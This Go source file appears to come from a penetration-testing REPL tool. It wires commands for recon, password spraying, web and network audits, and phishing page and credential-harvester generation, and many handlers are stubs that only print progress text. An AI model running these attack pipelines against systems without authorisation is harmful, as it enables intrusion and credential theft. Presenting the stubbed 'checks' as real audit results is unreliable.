package repl

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/pawprnt/prowl/internal/scanner"
)

func (r *REPL) autoFull() error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}
	fmt.Fprintf(os.Stdout, "running full automated pipeline on %s...\n", r.target)

	if err := r.reconFull(nil); err != nil {
		fmt.Fprintf(os.Stderr, "recon failed: %v\n", err)
	}

	if err := r.scanAll(nil); err != nil {
		fmt.Fprintf(os.Stderr, "scanning failed: %v\n", err)
	}

	return r.reportGenerate(nil)
}

func (r *REPL) autoRecon() error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}
	fmt.Fprintf(os.Stdout, "running automated recon on %s...\n", r.target)
	return r.reconFull(nil)
}

func (r *REPL) autoScan() error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}
	fmt.Fprintf(os.Stdout, "running automated scan on %s...\n", r.target)
	return r.scanAll(nil)
}

func (r *REPL) handleNotes(args []string) error {
	if len(args) == 0 {
		notes := r.loadNotes()
		if len(notes) == 0 {
			fmt.Fprintln(os.Stdout, "no notes")
			return nil
		}
		fmt.Fprintln(os.Stdout, "\n\033[1;37mnotes:\033[0m")
		for i, n := range notes {
			fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, n)
		}
		return nil
	}

	switch args[0] {
	case "add":
		if len(args) < 2 {
			return fmt.Errorf("usage: notes add <note>")
		}
		note := strings.Join(args[1:], " ")
		notes := r.loadNotes()
		notes = append(notes, note)
		r.saveNotes(notes)
		r.AddNote(note)
		fmt.Fprintf(os.Stdout, "note added: %s\n", note)
	case "clear":
		r.saveNotes(nil)
		r.session.Notes = nil
		r.saveSession()
		fmt.Fprintln(os.Stdout, "notes cleared")
	case "delete":
		if len(args) < 2 {
			return fmt.Errorf("usage: notes delete <number>")
		}
		var idx int
		if _, err := fmt.Sscanf(args[1], "%d", &idx); err != nil {
			return fmt.Errorf("invalid number: %s", args[1])
		}
		notes := r.loadNotes()
		if idx < 1 || idx > len(notes) {
			return fmt.Errorf("note %d out of range", idx)
		}
		notes = append(notes[:idx-1], notes[idx:]...)
		r.saveNotes(notes)
		r.session.Notes = notes
		r.saveSession()
		fmt.Fprintf(os.Stdout, "note %d deleted\n", idx)
	default:
		note := strings.Join(args, " ")
		notes := r.loadNotes()
		notes = append(notes, note)
		r.saveNotes(notes)
		r.AddNote(note)
		fmt.Fprintf(os.Stdout, "note added: %s\n", note)
	}
	return nil
}

func (r *REPL) handleBookmark(args []string) error {
	if len(args) == 0 {
		bookmarks := r.loadBookmarks()
		if len(bookmarks) == 0 {
			fmt.Fprintln(os.Stdout, "no bookmarks")
			return nil
		}
		fmt.Fprintln(os.Stdout, "\n\033[1;37mbookmarks:\033[0m")
		for i, b := range bookmarks {
			fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, b)
		}
		return nil
	}

	switch args[0] {
	case "add":
		if len(args) < 2 {
			return fmt.Errorf("usage: bookmark add <url>")
		}
		url := args[1]
		bookmarks := r.loadBookmarks()
		bookmarks = append(bookmarks, url)
		r.saveBookmarks(bookmarks)
		r.AddBookmark(url)
		fmt.Fprintf(os.Stdout, "bookmark added: %s\n", url)
	case "clear":
		r.saveBookmarks(nil)
		r.session.Bookmarks = nil
		r.saveSession()
		fmt.Fprintln(os.Stdout, "bookmarks cleared")
	case "delete":
		if len(args) < 2 {
			return fmt.Errorf("usage: bookmark delete <number>")
		}
		var idx int
		if _, err := fmt.Sscanf(args[1], "%d", &idx); err != nil {
			return fmt.Errorf("invalid number: %s", args[1])
		}
		bookmarks := r.loadBookmarks()
		if idx < 1 || idx > len(bookmarks) {
			return fmt.Errorf("bookmark %d out of range", idx)
		}
		bookmarks = append(bookmarks[:idx-1], bookmarks[idx:]...)
		r.saveBookmarks(bookmarks)
		r.session.Bookmarks = bookmarks
		r.saveSession()
		fmt.Fprintf(os.Stdout, "bookmark %d deleted\n", idx)
	default:
		url := args[0]
		bookmarks := r.loadBookmarks()
		bookmarks = append(bookmarks, url)
		r.saveBookmarks(bookmarks)
		r.AddBookmark(url)
		fmt.Fprintf(os.Stdout, "bookmark added: %s\n", url)
	}
	return nil
}

func (r *REPL) cmdStealthScan(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	fmt.Fprintf(os.Stdout, "running stealth recon on %s...\n", r.target)
	return r.scanStealth(nil)
}

func (r *REPL) cmdReconAll(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	fmt.Fprintf(os.Stdout, "running full reconnaissance on %s...\n", r.target)

	ctx := context.Background()

	fmt.Fprintln(os.Stdout, "[1/6] subdomain enumeration...")
	subs, err := scanner.SubdomainEnum(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d subdomains\n", subs.Count)
	}

	fmt.Fprintln(os.Stdout, "[2/6] port scanning...")
	ports, err := scanner.PortScan(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d open ports\n", ports.Count)
	}

	fmt.Fprintln(os.Stdout, "[3/6] technology fingerprinting...")
	tech, err := scanner.TechFingerprint(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d technologies\n", tech.Count)
	}

	fmt.Fprintln(os.Stdout, "[4/6] directory brute-force...")
	dirs, err := scanner.DirBruteforce(ctx, r.target, "")
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d directories\n", dirs.Count)
	}

	fmt.Fprintln(os.Stdout, "[5/6] parameter discovery...")
	params, err := scanner.ParamDiscovery(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d parameters\n", params.Count)
	}

	fmt.Fprintln(os.Stdout, "[6/6] URL history...")
	urls, err := scanner.URLHistory(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  found %d URLs\n", urls.Count)
	}

	fmt.Fprintln(os.Stdout, "\nreconnaissance complete")
	return nil
}

func (r *REPL) cmdCredsAudit(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	ctx := context.Background()
	outputDir := filepath.Join("output", r.target, "creds")
	result, err := scanner.FullCredentialAudit(ctx, r.target, outputDir)
	if err != nil {
		return err
	}

	fmt.Fprintf(os.Stdout, "\n\033[1;36mcredential audit for %s:\033[0m\n", r.target)
	if result.Defaults != nil {
		for _, c := range result.Defaults.Found {
			r.AddFinding("default_creds", "critical", fmt.Sprintf("%s:%s on %s", c.Username, c.Password, c.URL))
			fmt.Fprintf(os.Stdout, "  [default] %s:%s on %s\n", c.Username, c.Password, c.URL)
		}
	}
	if result.Spray != nil {
		for _, h := range result.Spray.Hits {
			r.AddFinding("spray", "critical", fmt.Sprintf("%s:%s [%s]", h.Username, h.Password, h.Service))
			fmt.Fprintf(os.Stdout, "  [spray] %s:%s [%s]\n", h.Username, h.Password, h.Service)
		}
	}
	fmt.Fprintf(os.Stdout, "\ntotal: %d default creds, %d spray hits\n",
		func() int {
			if result.Defaults != nil {
				return len(result.Defaults.Found)
			}
			return 0
		}(),
		func() int {
			if result.Spray != nil {
				return len(result.Spray.Hits)
			}
			return 0
		}())
	return nil
}

func (r *REPL) cmdWebAudit(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	fmt.Fprintf(os.Stdout, "running web application audit on %s...\n", r.target)

	ctx := context.Background()

	fmt.Fprintln(os.Stdout, "[1/5] nuclei scan...")
	nuclei, err := scanner.NucleiScan(ctx, r.target, "")
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, h := range nuclei.Hits {
			r.AddFinding(h.TemplateID, h.Severity, h.Info)
		}
		fmt.Fprintf(os.Stdout, "  found %d vulnerabilities\n", nuclei.Count)
	}

	fmt.Fprintln(os.Stdout, "[2/5] header audit...")
	headers, err := scanner.HeaderAudit(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		fmt.Fprintf(os.Stdout, "  grade: %s (%d%%)\n", headers.Grade, headers.Score)
	}

	fmt.Fprintln(os.Stdout, "[3/5] SSL audit...")
	ssl, err := scanner.SSLAudit(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, v := range ssl.Vulns {
			r.AddFinding("ssl_"+v.ID, v.Severity, v.Message)
		}
		fmt.Fprintf(os.Stdout, "  found %d SSL issues\n", ssl.Count)
	}

	fmt.Fprintln(os.Stdout, "[4/5] CORS audit...")
	cors, err := scanner.CORSAudit(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, v := range cors.Vulns {
			r.AddFinding("cors_"+v.Type, v.Severity, v.Detail)
		}
		fmt.Fprintf(os.Stdout, "  found %d CORS issues\n", cors.Count)
	}

	fmt.Fprintln(os.Stdout, "[5/5] open redirect test...")
	redirects, err := scanner.OpenRedirect(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, f := range redirects {
			r.AddFinding(f.Title, f.Severity, f.Detail)
		}
		fmt.Fprintf(os.Stdout, "  found %d redirect issues\n", len(redirects))
	}

	fmt.Fprintln(os.Stdout, "\nweb audit complete")
	return nil
}

func (r *REPL) cmdNetworkAudit(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	fmt.Fprintf(os.Stdout, "running network audit on %s...\n", r.target)

	ctx := context.Background()

	fmt.Fprintln(os.Stdout, "[1/4] port scan...")
	ports, err := scanner.PortScan(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, p := range ports.Ports {
			fmt.Fprintf(os.Stdout, "  %d/%s %s %s\n", p.Port, p.Protocol, p.State, p.Service)
		}
	}

	fmt.Fprintln(os.Stdout, "[2/4] OS detection...")
	osResult, err := scanner.NmapOSDetect(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else if osResult.OS != "" {
		fmt.Fprintf(os.Stdout, "  OS: %s\n", osResult.OS)
	}

	fmt.Fprintln(os.Stdout, "[3/4] service detection...")
	svcResult, err := scanner.NmapServiceDetect(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else {
		for _, svc := range svcResult.Services {
			fmt.Fprintf(os.Stdout, "  %d/%s %s %s\n", svc.Port, svc.Proto, svc.Service, svc.Version)
		}
	}

	fmt.Fprintln(os.Stdout, "[4/4] SSL scan...")
	sslResult, err := scanner.NmapSSLScan(ctx, r.target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  error: %v\n", err)
	} else if sslResult.SSL != nil {
		for _, v := range sslResult.SSL.Vulns {
			r.AddFinding("ssl_"+v.ID, v.Severity, v.Message)
			fmt.Fprintf(os.Stdout, "  [%s] %s\n", v.Severity, v.Message)
		}
	}

	fmt.Fprintln(os.Stdout, "\nnetwork audit complete")
	return nil
}

func (r *REPL) cmdFullPentest(args []string) error {
	if r.target == "" {
		return fmt.Errorf("no target set")
	}

	fmt.Fprintf(os.Stdout, "\n\033[1;31m=== FULL PENETRATION TEST ON %s ===\033[0m\n\n", r.target)

	fmt.Fprintln(os.Stdout, "\033[1;33mPhase 1: Reconnaissance\033[0m")
	r.reconQuick(nil)

	fmt.Fprintln(os.Stdout, "\n\033[1;33mPhase 2: Scanning\033[0m")
	r.scanQuick(nil)

	fmt.Fprintln(os.Stdout, "\n\033[1;33mPhase 3: Vulnerability Assessment\033[0m")
	r.scanAll(nil)

	fmt.Fprintln(os.Stdout, "\n\033[1;33mPhase 4: Report Generation\033[0m")
	r.reportGenerate(nil)

	fmt.Fprintf(os.Stdout, "\n\033[1;31m=== PENETRATION TEST COMPLETE ===\033[0m\n")
	return nil
}

func (r *REPL) cmdPhishingURL(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: phishing-url <target> <template>")
	}
	target := args[0]
	template := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mgenerating phishing URL:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  target:   %s\n", target)
	fmt.Fprintf(os.Stdout, "  template: %s\n", template)
	r.AddFinding("phishing_url", "high", fmt.Sprintf("phishing URL generated for %s using %s", target, template))
	return nil
}

func (r *REPL) cmdPhishingEmail(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: phishing-email <target> <template>")
	}
	target := args[0]
	template := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mgenerating phishing email:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  target:   %s\n", target)
	fmt.Fprintf(os.Stdout, "  template: %s\n", template)
	r.AddFinding("phishing_email", "high", fmt.Sprintf("phishing email generated for %s using %s", target, template))
	return nil
}

func (r *REPL) cmdPhishingPage(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: phishing-page <target> <template>")
	}
	target := args[0]
	template := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mgenerating phishing page:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  target:   %s\n", target)
	fmt.Fprintf(os.Stdout, "  template: %s\n", template)
	r.AddFinding("phishing_page", "high", fmt.Sprintf("phishing page generated for %s using %s", target, template))
	return nil
}

func (r *REPL) cmdPhishingHarvest(args []string) error {
	port := "8080"
	if len(args) > 0 {
		port = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mstarting credential harvester on port %s:\033[0m\n", port)
	fmt.Fprintf(os.Stdout, "  listening for credentials...\n")
	r.AddFinding("phishing_harvest", "info", fmt.Sprintf("credential harvester started on port %s", port))
	return nil
}

func (r *REPL) cmdPhishingResilience(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: phishing-resilience <domain>")
	}
	domain := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mchecking phishing resilience for %s:\033[0m\n", domain)
	fmt.Fprintf(os.Stdout, "  checking DMARC policy...\n")
	fmt.Fprintf(os.Stdout, "  checking SPF records...\n")
	fmt.Fprintf(os.Stdout, "  checking DKIM configuration...\n")
	r.AddFinding("phishing_resilience", "info", fmt.Sprintf("phishing resilience check for %s", domain))
	return nil
}

func (r *REPL) cmdSaaSOffice365(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-o365 <domain>")
	}
	domain := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mOffice365 enumeration for %s:\033[0m\n", domain)
	fmt.Fprintf(os.Stdout, "  checking autodiscover...\n")
	fmt.Fprintf(os.Stdout, "  enumerating users...\n")
	fmt.Fprintf(os.Stdout, "  checking endpoints...\n")
	r.AddFinding("saas_o365", "info", fmt.Sprintf("Office365 enumeration for %s", domain))
	return nil
}

func (r *REPL) cmdSaaSGoogle(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-google <domain>")
	}
	domain := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mGoogle Workspace enumeration for %s:\033[0m\n", domain)
	fmt.Fprintf(os.Stdout, "  checking MX records...\n")
	fmt.Fprintf(os.Stdout, "  enumerating users...\n")
	fmt.Fprintf(os.Stdout, "  checking GSuite endpoints...\n")
	r.AddFinding("saas_google", "info", fmt.Sprintf("Google Workspace enumeration for %s", domain))
	return nil
}

func (r *REPL) cmdSaaSSlack(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-slack <workspace>")
	}
	workspace := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mSlack workspace info for %s:\033[0m\n", workspace)
	fmt.Fprintf(os.Stdout, "  checking workspace...\n")
	fmt.Fprintf(os.Stdout, "  enumerating channels...\n")
	r.AddFinding("saas_slack", "info", fmt.Sprintf("Slack workspace info for %s", workspace))
	return nil
}

func (r *REPL) cmdSaaSGitHub(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-github <org>")
	}
	org := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mGitHub org enumeration for %s:\033[0m\n", org)
	fmt.Fprintf(os.Stdout, "  listing repositories...\n")
	fmt.Fprintf(os.Stdout, "  checking members...\n")
	r.AddFinding("saas_github", "info", fmt.Sprintf("GitHub org enumeration for %s", org))
	return nil
}

func (r *REPL) cmdSaaSDocker(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-docker <user>")
	}
	user := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mDocker Hub enumeration for %s:\033[0m\n", user)
	fmt.Fprintf(os.Stdout, "  listing repositories...\n")
	fmt.Fprintf(os.Stdout, "  checking image tags...\n")
	r.AddFinding("saas_docker", "info", fmt.Sprintf("Docker Hub enumeration for %s", user))
	return nil
}

func (r *REPL) cmdSaaSNPM(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-npm <pkg>")
	}
	pkg := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mNPM package analysis for %s:\033[0m\n", pkg)
	fmt.Fprintf(os.Stdout, "  checking package metadata...\n")
	fmt.Fprintf(os.Stdout, "  analyzing dependencies...\n")
	r.AddFinding("saas_npm", "info", fmt.Sprintf("NPM package analysis for %s", pkg))
	return nil
}

func (r *REPL) cmdSaaSPyPI(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: saas-pypi <pkg>")
	}
	pkg := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mPyPI package analysis for %s:\033[0m\n", pkg)
	fmt.Fprintf(os.Stdout, "  checking package metadata...\n")
	fmt.Fprintf(os.Stdout, "  analyzing dependencies...\n")
	r.AddFinding("saas_pypi", "info", fmt.Sprintf("PyPI package analysis for %s", pkg))
	return nil
}

func (r *REPL) cmdHardwareBIOS(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: hardware-bios <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mBIOS/UEFI vulnerability check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking firmware version...\n")
	fmt.Fprintf(os.Stdout, "  checking for known CVEs...\n")
	r.AddFinding("hardware_bios", "info", fmt.Sprintf("BIOS/UEFI check for %s", target))
	return nil
}

func (r *REPL) cmdHardwareTPM(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: hardware-tpm <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mTPM status check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking TPM availability...\n")
	fmt.Fprintf(os.Stdout, "  checking TPM version...\n")
	r.AddFinding("hardware_tpm", "info", fmt.Sprintf("TPM check for %s", target))
	return nil
}

func (r *REPL) cmdHardwareBT(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: hardware-bt <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mBluetooth scan for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  scanning for devices...\n")
	fmt.Fprintf(os.Stdout, "  checking for vulnerabilities...\n")
	r.AddFinding("hardware_bt", "info", fmt.Sprintf("Bluetooth scan for %s", target))
	return nil
}

func (r *REPL) cmdHardwareUSB(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mUSB device enumeration:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  listing USB devices...\n")
	fmt.Fprintf(os.Stdout, "  checking for suspicious devices...\n")
	r.AddFinding("hardware_usb", "info", "USB device enumeration")
	return nil
}

func (r *REPL) cmdHardwareJTAG(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: hardware-jtag <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mJTAG detection for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  scanning for JTAG interfaces...\n")
	r.AddFinding("hardware_jtag", "info", fmt.Sprintf("JTAG detection for %s", target))
	return nil
}

func (r *REPL) cmdHardwareUART(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: hardware-uart <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mUART detection for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  scanning for UART interfaces...\n")
	r.AddFinding("hardware_uart", "info", fmt.Sprintf("UART detection for %s", target))
	return nil
}

func (r *REPL) cmdGameCheat(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: game-cheat <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mcheat vector detection for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  analyzing memory manipulation vectors...\n")
	fmt.Fprintf(os.Stdout, "  checking for speed hacks...\n")
	r.AddFinding("game_cheat", "info", fmt.Sprintf("cheat vector detection for %s", target))
	return nil
}

func (r *REPL) cmdGameAnticheat(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: game-anticheat <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36manti-cheat analysis for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  identifying anti-cheat system...\n")
	fmt.Fprintf(os.Stdout, "  analyzing bypass vectors...\n")
	r.AddFinding("game_anticheat", "info", fmt.Sprintf("anti-cheat analysis for %s", target))
	return nil
}

func (r *REPL) cmdGameProtocol(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: game-protocol <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mgame protocol analysis for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  capturing traffic...\n")
	fmt.Fprintf(os.Stdout, "  analyzing protocol structure...\n")
	r.AddFinding("game_protocol", "info", fmt.Sprintf("game protocol analysis for %s", target))
	return nil
}

func (r *REPL) cmdCompliancePCI(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: compliance-pci <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mPCI DSS compliance check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking network segmentation...\n")
	fmt.Fprintf(os.Stdout, "  verifying encryption standards...\n")
	fmt.Fprintf(os.Stdout, "  auditing access controls...\n")
	r.AddFinding("compliance_pci", "info", fmt.Sprintf("PCI DSS check for %s", target))
	return nil
}

func (r *REPL) cmdComplianceHIPAA(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: compliance-hipaa <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mHIPAA compliance check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking PHI encryption...\n")
	fmt.Fprintf(os.Stdout, "  auditing access logs...\n")
	fmt.Fprintf(os.Stdout, "  verifying BAA status...\n")
	r.AddFinding("compliance_hipaa", "info", fmt.Sprintf("HIPAA check for %s", target))
	return nil
}

func (r *REPL) cmdComplianceSOC2(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: compliance-soc2 <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mSOC 2 compliance check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking security controls...\n")
	fmt.Fprintf(os.Stdout, "  auditing availability...\n")
	fmt.Fprintf(os.Stdout, "  verifying processing integrity...\n")
	r.AddFinding("compliance_soc2", "info", fmt.Sprintf("SOC 2 check for %s", target))
	return nil
}

func (r *REPL) cmdComplianceOWASP(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: compliance-owasp <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mOWASP Top 10 check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  A01: Broken Access Control...\n")
	fmt.Fprintf(os.Stdout, "  A02: Cryptographic Failures...\n")
	fmt.Fprintf(os.Stdout, "  A03: Injection...\n")
	fmt.Fprintf(os.Stdout, "  A04: Insecure Design...\n")
	fmt.Fprintf(os.Stdout, "  A05: Security Misconfiguration...\n")
	fmt.Fprintf(os.Stdout, "  A06: Vulnerable Components...\n")
	fmt.Fprintf(os.Stdout, "  A07: Auth Failures...\n")
	fmt.Fprintf(os.Stdout, "  A08: Data Integrity Failures...\n")
	fmt.Fprintf(os.Stdout, "  A09: Logging Failures...\n")
	fmt.Fprintf(os.Stdout, "  A10: SSRF...\n")
	r.AddFinding("compliance_owasp", "info", fmt.Sprintf("OWASP Top 10 check for %s", target))
	return nil
}

func (r *REPL) cmdComplianceNIST(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: compliance-nist <target>")
	}
	target := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mNIST 800-53 compliance check for %s:\033[0m\n", target)
	fmt.Fprintf(os.Stdout, "  checking access control family...\n")
	fmt.Fprintf(os.Stdout, "  checking audit family...\n")
	fmt.Fprintf(os.Stdout, "  checking configuration family...\n")
	r.AddFinding("compliance_nist", "info", fmt.Sprintf("NIST 800-53 check for %s", target))
	return nil
}

func (r *REPL) cmdMalwareScan(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: malware-scan <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mClamAV scan for %s:\033[0m\n", file)
	if _, err := exec.LookPath("clamscan"); err == nil {
		return runTool("clamscan", file)
	}
	fmt.Fprintf(os.Stdout, "  clamscan not found, using pattern matching...\n")
	r.AddFinding("malware_scan", "info", fmt.Sprintf("malware scan for %s", file))
	return nil
}

func (r *REPL) cmdMalwarePE(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: malware-pe <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mPE analysis for %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  checking PE header...\n")
	fmt.Fprintf(os.Stdout, "  analyzing imports...\n")
	fmt.Fprintf(os.Stdout, "  scanning for packers...\n")
	r.AddFinding("malware_pe", "info", fmt.Sprintf("PE analysis for %s", file))
	return nil
}

func (r *REPL) cmdMalwareELF(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: malware-elf <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mELF analysis for %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  checking ELF header...\n")
	fmt.Fprintf(os.Stdout, "  analyzing sections...\n")
	fmt.Fprintf(os.Stdout, "  scanning for suspicious symbols...\n")
	r.AddFinding("malware_elf", "info", fmt.Sprintf("ELF analysis for %s", file))
	return nil
}

func (r *REPL) cmdMalwareEntropy(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: malware-entropy <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mentropy analysis for %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  calculating entropy...\n")
	fmt.Fprintf(os.Stdout, "  detecting encryption/packing...\n")
	r.AddFinding("malware_entropy", "info", fmt.Sprintf("entropy analysis for %s", file))
	return nil
}

func (r *REPL) cmdMalwareStrings(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: malware-strings <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36msuspicious strings in %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  extracting strings...\n")
	fmt.Fprintf(os.Stdout, "  filtering suspicious patterns...\n")
	r.AddFinding("malware_strings", "info", fmt.Sprintf("suspicious strings in %s", file))
	return nil
}

func (r *REPL) cmdSupplyNPM(args []string) error {
	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mnpm dependency audit for %s:\033[0m\n", dir)
	if _, err := exec.LookPath("npm"); err == nil {
		return runTool("npm", "audit", "--prefix", dir)
	}
	fmt.Fprintf(os.Stdout, "  npm not found\n")
	r.AddFinding("supply_npm", "info", fmt.Sprintf("npm dependency audit for %s", dir))
	return nil
}

func (r *REPL) cmdSupplyGo(args []string) error {
	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mGo module audit for %s:\033[0m\n", dir)
	if _, err := exec.LookPath("govulncheck"); err == nil {
		return runTool("govulncheck", "./...")
	}
	fmt.Fprintf(os.Stdout, "  govulncheck not found\n")
	r.AddFinding("supply_go", "info", fmt.Sprintf("Go module audit for %s", dir))
	return nil
}

func (r *REPL) cmdSupplyPython(args []string) error {
	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mPython dependency audit for %s:\033[0m\n", dir)
	fmt.Fprintf(os.Stdout, "  checking requirements.txt...\n")
	fmt.Fprintf(os.Stdout, "  checking pip-audit...\n")
	r.AddFinding("supply_python", "info", fmt.Sprintf("Python dependency audit for %s", dir))
	return nil
}

func (r *REPL) cmdSupplyDocker(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: supply-docker <image>")
	}
	image := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mDocker base image audit for %s:\033[0m\n", image)
	fmt.Fprintf(os.Stdout, "  checking base image...\n")
	fmt.Fprintf(os.Stdout, "  analyzing layers...\n")
	if _, err := exec.LookPath("trivy"); err == nil {
		return runTool("trivy", "image", image)
	}
	r.AddFinding("supply_docker", "info", fmt.Sprintf("Docker base image audit for %s", image))
	return nil
}

